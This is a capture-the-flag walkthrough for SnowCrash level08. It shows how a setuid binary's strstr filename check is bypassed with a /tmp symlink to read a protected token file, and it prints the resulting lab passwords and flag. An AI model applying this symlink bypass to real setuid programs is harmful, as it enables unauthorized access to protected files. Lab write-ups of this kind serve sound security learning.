# 1st Step  
List the file with `ls -l` will show us :  
```
level08@SnowCrash:~$ ls -l
total 16
-rwsr-s---+ 1 flag08 level08 8617 Mar  5  2016 level08
-rw-------  1 flag08 flag08    26 Mar  5  2016 token
level08@SnowCrash:~$
```  
Let's do some tests  
```
level08@SnowCrash:~$ ./level08
./level08 [file to read]
level08@SnowCrash:~$ ./level08 token
You may not access 'token'
level08@SnowCrash:~$
```  
If we look at the executable with `strings`:  
```
level08@SnowCrash:~$ strings level08
[...]
token
You may not access '%s'
[...]
```  
Seems there is a check against "token", let's verify our hypotesis with `ltrace`  
```
level08@SnowCrash:~$ ltrace ./level08 token
__libc_start_main(0x8048554, 2, 0xbffff7d4, 0x80486b0, 0x8048720 <unfinished ...>
strstr("token", "token")                                                                                                                           = "token"
printf("You may not access '%s'\n", "token"You may not access 'token'
)                                                                                                       = 27
exit(1 <unfinished ...>
+++ exited (status 1) +++
level08@SnowCrash:~$
```  
We understand that the executable opens the file passed as argument, then reads its content and prints it to the standard output but it call strstr against "token"  
  
# 2nd Step
We simply have to create a symbolic link, without token in it  and read it  
```
level08@SnowCrash:~$ ln -s ~/token /tmp/my_file
level08@SnowCrash:~$ ./level08 /tmp/my_file
quif5eloekouj29ke0vouxean
level08@SnowCrash:~$ su flag08
Password:
Don't forget to launch getflag !
flag08@SnowCrash:~$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
flag08@SnowCrash:~$ su level09
Password:
level09@SnowCrash:~$
```  
level08 passed !
